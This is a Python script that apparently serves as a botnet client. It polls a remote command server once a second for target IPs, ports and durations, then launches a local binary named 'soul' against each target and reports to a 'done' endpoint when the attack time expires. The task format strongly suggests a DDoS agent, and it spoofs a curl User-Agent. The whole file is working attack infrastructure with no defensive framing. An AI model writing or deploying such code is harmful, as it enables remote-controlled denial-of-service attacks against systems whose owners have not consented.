import requests
import subprocess
import time
import json

BASE_URL = 'https://hingoli.io/soul'
SOUL_PATH = '/17878734081385/'
DONE_PATH = '/17878734081385/done'

active_tasks = {}

def process_new_task(connection):
    ip = connection.get('ip')
    port = connection.get('port')
    time_val = connection.get('time')

    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            try:
                process = subprocess.Popen(['./soul', ip, str(port), str(time_val)])
                print(f"[+] Launched binary: ./soul {ip} {port} {time_val} (PID: {process.pid})")
            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
            active_tasks[key] = int(time_val)
        else:
            pass
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():
    headers = {
        'User-Agent': 'curl/8.5.0'
    }
    while True:
        try:
            response = requests.get(f'{BASE_URL}{SOUL_PATH}', headers=headers, timeout=10)
            response.raise_for_status()
            
           
            if not response.text.strip():
                print("[!] Empty response received")
                time.sleep(1)
                continue
            
            try:
                data = response.json()
            except json.JSONDecodeError as je:
                print(f"[!] JSON decode error: {je}")
                print(f"[DEBUG] Status: {response.status_code}")
                print(f"[DEBUG] Content preview: {response.text[:500]}")
                time.sleep(1)
                continue

            if isinstance(data, dict) and 'connections' in data:
                for connection in data['connections']:
                    if isinstance(connection, dict):
                        process_new_task(connection)
            else:
                print(f"[!] Unexpected data structure: {type(data)}")

            tasks_to_delete = []
            for key in list(active_tasks.keys()):
                active_tasks[key] -= 1
                if active_tasks[key] <= 0:
                    ip, port, orig_time = key
                    print(f"[+] Time expired for task: IP={ip}, Port={port}, Original Time={orig_time}")
                    try:
                        del_resp = requests.get(f'{BASE_URL}{DONE_PATH}',
                                                params={'ip': ip, 'port': port, 'time': orig_time},
                                                headers=headers, timeout=10)
                        if del_resp.status_code == 200:
                            print(f"[+] Sent delete request for IP={ip}, Port={port}, Time={orig_time}")
                        else:
                            print(f"[!] Delete request failed with status: {del_resp.status_code}")
                    except Exception as e:
                        print(f"[!] Failed to send delete request: {e}")
                    tasks_to_delete.append(key)

            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            time.sleep(1)
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    main_loop()
